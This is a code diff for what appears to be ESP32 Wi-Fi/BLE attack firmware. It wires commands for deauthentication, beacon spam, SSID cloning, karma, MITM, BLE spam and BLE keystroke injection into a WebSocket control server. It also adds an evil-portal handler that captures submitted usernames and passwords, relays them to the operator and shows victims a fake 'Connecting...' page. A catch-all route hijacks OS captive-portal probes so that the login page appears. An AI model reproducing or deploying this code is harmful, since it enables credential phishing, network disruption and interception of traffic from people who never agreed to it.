@@ -9,6 +9,16 @@
 #include "modules/wifi/client_scanner.h"
 #include "modules/wifi/arp_scanner.h"
 #include "modules/wifi/sniffer.h"
+#include "modules/wifi/beacon_spam.h"
+#include "modules/wifi/deauth.h"
+#include "modules/wifi/ssid_clone.h"
+#include "modules/wifi/karma.h"
+#include "modules/wifi/evil_portal.h"
+#include "modules/wifi/mitm.h"
+#include "modules/ble/ble_scan.h"
+#include "modules/ble/ble_spam.h"
+#include "modules/ble/bad_ble.h"
+#include "modules/ble/ble_detect.h"
 #include <ArduinoJson.h>
 #include <ESPAsyncWebServer.h>
 
@@ -26,7 +36,9 @@ struct ModuleLaunchParams {
     FGModule mod;
     char ssid[33];
     char pass[65];
+    char list[160];   // beacon-spam SSID list (comma-separated)
     uint8_t channel;
+    bool flag;        // generic flag (e.g. WPA2 privacy for SSID clone)
 };
 
 // ============================================================
@@ -95,6 +107,78 @@ static void onWsEvent(AsyncWebSocket* server, AsyncWebSocketClient* client,
                 if (ch < 0 || ch > 14) ch = 0;
                 fg_launch_module(MOD_WIFI_SNIFFER, nullptr, nullptr, (uint8_t)ch);
             }
+            else if (strcmp(cmd, "beacon_spam") == 0) {
+                int ch = doc["channel"] | 0;
+                if (ch < 0 || ch > 14) ch = 0;
+                const char* list = doc["ssids"];  // optional CSV
+                fg_launch_module(MOD_WIFI_BEACON_SPAM, nullptr, nullptr,
+                                 (uint8_t)ch, false, list);
+            }
+            else if (strcmp(cmd, "deauth") == 0) {
+                const char* bssid = doc["bssid"];
+                const char* target = doc["target"];  // optional client MAC
+                int ch = doc["channel"] | (int)FG_AP_CHANNEL;
+                if (!bssid) {
+                    fg_send_result("{\"event\":\"error\",\"msg\":\"deauth requires bssid\"}");
+                    return;
+                }
+                fg_launch_module(MOD_WIFI_DEAUTH, bssid, target, (uint8_t)ch);
+            }
+            else if (strcmp(cmd, "ssid_clone") == 0) {
+                const char* ssid = doc["ssid"];
+                int ch = doc["channel"] | 0;
+                bool wpa2 = doc["wpa2"] | false;
+                if (!ssid) {
+                    fg_send_result("{\"event\":\"error\",\"msg\":\"ssid_clone requires ssid\"}");
+                    return;
+                }
+                fg_launch_module(MOD_WIFI_SSID_CLONE, ssid, nullptr, (uint8_t)ch, wpa2);
+            }
+            else if (strcmp(cmd, "karma") == 0) {
+                int ch = doc["channel"] | 0;
+                if (ch < 0 || ch > 14) ch = 0;
+                fg_launch_module(MOD_WIFI_KARMA, nullptr, nullptr, (uint8_t)ch);
+            }
+            else if (strcmp(cmd, "evil_portal") == 0) {
+                const char* ssid = doc["ssid"];
+                int ch = doc["channel"] | 0;
+                fg_launch_module(MOD_WIFI_EVIL_PORTAL, ssid ? ssid : "Free WiFi",
+                                 nullptr, (uint8_t)ch);
+            }
+            else if (strcmp(cmd, "mitm") == 0) {
+                const char* ssid = doc["ssid"];
+                const char* pass = doc["pass"];
+                const char* target = doc["target"];  // "all"/omitted or a client IP
+                if (!ssid || !pass) {
+                    fg_send_result("{\"event\":\"error\",\"msg\":\"mitm requires ssid and pass\"}");
+                    return;
+                }
+                fg_launch_module(MOD_WIFI_MITM, ssid, pass, 0, false,
+                                 target ? target : "all");
+            }
+            else if (strcmp(cmd, "ble_scan") == 0) {
+                // Optional "secs": 0 (default) scans until stop.
+                int secs = doc["secs"] | 0;
+                if (secs < 0) secs = 0;
+                fg_launch_module(MOD_BLE_SCAN, nullptr, nullptr, (uint8_t)(secs > 255 ? 255 : secs));
+            }
+            else if (strcmp(cmd, "ble_spam") == 0) {
+                // "mode": 0 all (default), 1 apple, 2 microsoft, 3 android.
+                int mode = doc["mode"] | 0;
+                if (mode < 0 || mode > 3) mode = 0;
+                fg_launch_module(MOD_BLE_SPAM, nullptr, nullptr, (uint8_t)mode);
+            }
+            else if (strcmp(cmd, "ble_detect") == 0) {
+                // Optional "secs": 0 (default) detects until stop.
+                int secs = doc["secs"] | 0;
+                if (secs < 0) secs = 0;
+                fg_launch_module(MOD_BLE_DETECT, nullptr, nullptr, (uint8_t)(secs > 255 ? 255 : secs));
+            }
+            else if (strcmp(cmd, "bad_ble") == 0) {
+                // Optional "text": typed on connect; passed via the list field.
+                const char* text = doc["text"];
+                fg_launch_module(MOD_BLE_BAD_BLE, nullptr, nullptr, 0, false, text);
+            }
             else if (strcmp(cmd, "stop") == 0) {
                 g_stopRequested = true;
                 fg_send_result("{\"event\":\"log\",\"msg\":\"Stop requested...\"}");
@@ -115,7 +199,8 @@ static void onWsEvent(AsyncWebSocket* server, AsyncWebSocketClient* client,
 // ============================================================
 // Module launcher — creates a FreeRTOS task on Core 1
 // ============================================================
-bool fg_launch_module(FGModule mod, const char* ssid, const char* pass, uint8_t channel) {
+bool fg_launch_module(FGModule mod, const char* ssid, const char* pass,
+                      uint8_t channel, bool flag, const char* list) {
     if (g_moduleState != STATE_IDLE) {
         fg_send_result("{\"event\":\"error\",\"msg\":\"Another module is running. Send stop first.\"}");
         return false;
@@ -124,10 +209,16 @@ bool fg_launch_module(FGModule mod, const char* ssid, const char* pass, uint8_t 
     ModuleLaunchParams* params = new ModuleLaunchParams();
     params->mod = mod;
     params->channel = channel;
+    params->flag = flag;
     if (ssid) strncpy(params->ssid, ssid, 32);
     else params->ssid[0] = '\0';
+    params->ssid[32] = '\0';
     if (pass) strncpy(params->pass, pass, 64);
     else params->pass[0] = '\0';
+    params->pass[64] = '\0';
+    if (list) strncpy(params->list, list, sizeof(params->list) - 1);
+    else params->list[0] = '\0';
+    params->list[sizeof(params->list) - 1] = '\0';
 
     BaseType_t ok = xTaskCreatePinnedToCore(
         module_task_wrapper,
@@ -178,6 +269,36 @@ static void module_task_wrapper(void* param) {
         case MOD_WIFI_SNIFFER:
             fg_sniffer(p->channel);
             break;
+        case MOD_WIFI_BEACON_SPAM:
+            fg_beacon_spam(p->list[0] ? p->list : nullptr, p->channel);
+            break;
+        case MOD_WIFI_DEAUTH:
+            fg_deauth(p->ssid, p->pass, p->channel);  // ssid=BSSID, pass=target MAC
+            break;
+        case MOD_WIFI_SSID_CLONE:
+            fg_ssid_clone(p->ssid, p->channel, p->flag);
+            break;
+        case MOD_WIFI_KARMA:
+            fg_karma(p->channel);
+            break;
+        case MOD_WIFI_EVIL_PORTAL:
+            fg_evil_portal(p->ssid, p->channel);
+            break;
+        case MOD_WIFI_MITM:
+            fg_mitm(p->ssid, p->pass, p->list[0] ? p->list : nullptr);
+            break;
+        case MOD_BLE_SCAN:
+            fg_ble_scan((uint32_t)p->channel);   // channel field reused as duration secs
+            break;
+        case MOD_BLE_SPAM:
+            fg_ble_spam(p->channel);             // channel field reused as mode
+            break;
+        case MOD_BLE_BAD_BLE:
+            fg_bad_ble(p->list[0] ? p->list : nullptr);
+            break;
+        case MOD_BLE_DETECT:
+            fg_ble_detect((uint32_t)p->channel);   // channel field reused as duration secs
+            break;
         default:
             fg_send_result("{\"event\":\"error\",\"msg\":\"Module not implemented yet\"}");
             break;
@@ -224,11 +345,36 @@ void fg_web_server_init() {
     ws.onEvent(onWsEvent);
     server.addHandler(&ws);
 
-    // Serve main page from PROGMEM
+    // Serve main page from PROGMEM (or the captive portal page when active).
     server.on("/", HTTP_GET, [](AsyncWebServerRequest* request) {
+        if (g_portalActive) {
+            request->send_P(200, "text/html", fg_portal_html());
+            return;
+        }
         AsyncWebServerResponse* response = request->beginResponse_P(200, "text/html", index_html_gz, index_html_gz_len);
         response->addHeader("Content-Encoding", "gzip");
         request->send(response);
+    });
+
+    // Captive-portal credential capture.
+    server.on("/post", HTTP_POST, [](AsyncWebServerRequest* request) {
+        String user = request->hasParam("username", true)
+            ? request->getParam("username", true)->value() : String();
+        String pass = request->hasParam("password", true)
+            ? request->getParam("password", true)->value() : String();
+        // JSON-escape minimally (quotes/backslashes) before streaming.
+        auto esc = [](String s) {
+            s.replace("\\", "\\\\"); s.replace("\"", "\\\""); return s;
+        };
+        fg_send_result_fmt(
+            "{\"event\":\"creds\",\"portal\":\"%s\",\"user\":\"%s\",\"pass\":\"%s\"}",
+            fg_portal_ssid(), esc(user).c_str(), esc(pass).c_str());
+        Serial.printf("[PORTAL] CREDS user='%s' pass='%s'\n", user.c_str(), pass.c_str());
+        // Send them back to a believable "connecting" state.
+        request->send(200, "text/html",
+            "<html><body style='font-family:Arial;text-align:center;margin-top:60px'>"
+            "<h3>Connecting...</h3><p>Please wait while we verify your credentials.</p>"
+            "</body></html>");
     });
 
     server.on("/style.css", HTTP_GET, [](AsyncWebServerRequest* request) {
@@ -243,9 +389,16 @@ void fg_web_server_init() {
         request->send(response);
     });
 
-    // 404
+    // Catch-all: while the portal is active, serve the login page to every
+    // unknown path (covers OS captive-portal probes: generate_204,
+    // hotspot-detect.html, ncsi.txt, connectivitycheck, etc.). Otherwise
+    // redirect back to the dashboard.
     server.onNotFound([](AsyncWebServerRequest* request) {
-        request->redirect("/");
+        if (g_portalActive) {
+            request->send_P(200, "text/html", fg_portal_html());
+        } else {
+            request->redirect("/");
+        }
     });
 }
 
